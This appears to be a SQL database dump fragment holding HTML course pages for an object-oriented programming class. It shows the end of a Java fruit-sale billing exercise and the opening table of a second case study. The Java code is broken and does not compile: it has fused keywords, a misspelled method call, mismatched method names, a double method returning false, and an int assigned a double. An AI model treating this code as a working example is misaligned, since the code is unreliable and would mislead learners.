style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; return\r\nfalse;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return\r\ntrue;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; public\r\nvoid updateavailability(double need)</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;available_pcs\r\n= available_pcs - need;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;} <o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">class Sale</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; privateint\r\ncode;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; private\r\nFruit fobj;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; private\r\ndouble unit;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; private\r\ndouble amount;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; staticint\r\ncounter = 2000;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sale(Fruit\r\nfobj,double unit)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.fobj\r\n= fobj;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this.unit\r\n= unit;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;public\r\ndouble Bill()</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color:gray;mso-themecolor:background1;mso-themeshade:128\">//write your\r\ncode here<o:p></o:p></span></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(!fobj.checkavailability(unit))<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;System.out.println(\"Item\r\nnot available\");<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return\r\nfalse;&nbsp;&nbsp;&nbsp;&nbsp; <o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">amount\r\n= fobj.getprice() * unit;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">if(amount\r\n&gt; 500)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; amount\r\n= discount();<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fobj.pdateavailability(unit);</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return\r\namount;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public\r\ndouble discount()</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int\r\ndisc = amount/100 * 5;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; amount\r\n= amount - disc;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return\r\namount;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">class Demo</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;public\r\nstatic void main(String args[])<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fruit\r\nfobj = new Fruitingms(\"apple\",50.6,80.0);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sale\r\ns = new Sale(fobj,2.0);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(s.bill());<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Fruit\r\nfobj1 = new Fruitinpcs(\"banana\",200,3.0);</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sale\r\ns1 = new Sale(fobj,10);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println(s1.bill());</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:red\">&nbsp;</span></p>\r\n\r\n<p class=\"MsoNormal\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:red\">&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</span></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">&nbsp;</span></p><p class=\"MsoNormal\" style=\"text-align:justify;line-height:150%;tab-stops:.25in\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><o:p></o:p></span></p><p class=\"MsoListParagraph\" style=\"text-align: left; text-indent: -0.25in;\"><br></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\">3.</span></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><br></span></p><p class=\"MsoListParagraph\" style=\"text-align:justify;text-indent:-.25in;\r\nmso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\nmso-bidi-font-weight:bold\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"margin-right:1.0in;text-align:justify\"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><br></span></u></b></p><p class=\"MsoNormal\" style=\"margin-right:1.0in;text-align:justify\"><b><u><span style=\"font-size:12.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p></o:p></span></u></b></p><br><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody></tbody></table></div>','2019-09-27 06:03:22.000000',3,'logo_ac773e45b008d6616aadbc1a30507760_1x.png'),(4,'OOPS CASE STUDY 2','oops-case-study-2','<div align=\"center\">\r\n\r\n</div><div align=\"center\"><br></div><div align=\"center\" style=\"text-align: left; \"><div align=\"center\">\r\n\r\n<table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\">\r\n <tbody><tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Faculty Name<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border:solid windowtext 1.0pt;\r\n  border-left:none;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\r\n  solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Mr. P. N. Ramesh<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Course Code / Title<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black\">CS8392</span><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\n  mso-bidi-font-weight:bold\">&amp;Object Oriented Programming<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Focus Area<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:bold\">OOPS based\r\n  Design and Development of Solutions<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Learning Outcome<o:p></o:p></span></p>\r\n  </td>\r\n  <td width=\"460\" valign=\"top\" style=\"width:344.7pt;border-top:none;border-left:\r\n  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\r\n  mso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\r\n  mso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;mso-bidi-font-weight:bold\">Design a OOP\r\n  based application for the given requirements<o:p></o:p></span></p>\r\n  </td>\r\n </tr>\r\n <tr>\r\n  <td width=\"141\" valign=\"top\" style=\"width:106.1pt;border:solid windowtext 1.0pt;\r\n  border-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\r\n  padding:0in 5.4pt 0in 5.4pt\">\r\n  <p class=\"MsoNormal\"><span style=\"font-size:12.0pt;mso-bidi-font-size:11.0pt;\r\n  font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">Teaching Pedagogy 